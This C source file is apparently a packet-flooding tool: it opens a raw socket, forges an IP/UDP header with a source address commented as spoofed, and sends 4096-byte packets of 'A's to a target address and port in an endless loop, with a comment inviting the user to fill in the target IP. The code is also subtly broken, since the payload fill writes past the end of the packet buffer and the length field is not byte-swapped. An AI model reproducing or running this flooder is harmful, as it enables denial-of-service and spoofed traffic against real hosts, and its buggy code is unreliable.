#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>

#define SOURCE_IP "127.0.0.1" // Spoofed source IP address
#define DESTINATION_IP "127.0.0.1" // Replace with the target IP address
#define DESTINATION_PORT 5000    // Destination port on the target server
#define PACKET_SIZE 4096           // Size of the packet payload

// Function to calculate checksum
unsigned short checksum(unsigned short *ptr, int nbytes) {
    unsigned long sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        sum += *(unsigned char *)ptr;
    }
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

int main() {
    // Create raw socket
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sockfd < 0) {
        perror("Socket creation failed");
        return EXIT_FAILURE;
    }

    // Set socket options to allow IP headers
    int one = 1;
    const int *val = &one;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
        perror("Error setting IP_HDRINCL");
        return EXIT_FAILURE;
    }

    // Prepare destination sockaddr_in structure
    struct sockaddr_in dest;
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_port = htons(DESTINATION_PORT);
    dest.sin_addr.s_addr = inet_addr(DESTINATION_IP);

    // Create packet buffer
    char packet[PACKET_SIZE];
    memset(packet, 0, sizeof(packet));

    // Construct IP header
    struct iphdr *ip_header = (struct iphdr *)packet;
    ip_header->ihl = 5;
    ip_header->version = 4;
    ip_header->tos = 0;
    ip_header->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + PACKET_SIZE;
    ip_header->id = htons(54321);
    ip_header->frag_off = 0;
    ip_header->ttl = 255;
    ip_header->protocol = IPPROTO_UDP;
    ip_header->check = 0; // Set to 0 before calculating checksum
    ip_header->saddr = inet_addr(SOURCE_IP); // Spoofed source IP
    ip_header->daddr = dest.sin_addr.s_addr;

    // Construct UDP header
    struct udphdr *udp_header = (struct udphdr *)(packet + sizeof(struct iphdr));
    udp_header->source = htons(12345); // Spoofed source port
    udp_header->dest = dest.sin_port;
    udp_header->len = htons(sizeof(struct udphdr) + PACKET_SIZE);
    udp_header->check = 0; // Set to 0 before calculating checksum

    // Construct packet payload
    char *payload = packet + sizeof(struct iphdr) + sizeof(struct udphdr);
    memset(payload, 'A', PACKET_SIZE); // Fill payload with 'A's

    // Calculate checksums
    ip_header->check = checksum((unsigned short *)packet, sizeof(struct iphdr));
    udp_header->check = checksum((unsigned short *)udp_header, sizeof(struct udphdr) + PACKET_SIZE);


    int counter = 0;
    // Send packets in a loop
    while (1) {
        if (sendto(sockfd, packet, ip_header->tot_len, 0, (struct sockaddr *)&dest, sizeof(dest)) < 0) {
            perror("Packet sending failed");
            break;
        }
        counter++;
        printf("packets sent : %d",counter);
        printf("Packet sent.\n");
        usleep(100000); // Sleep for 100 milliseconds between sending packets
    }

    // Close socket
    close(sockfd);

    return EXIT_SUCCESS;
}
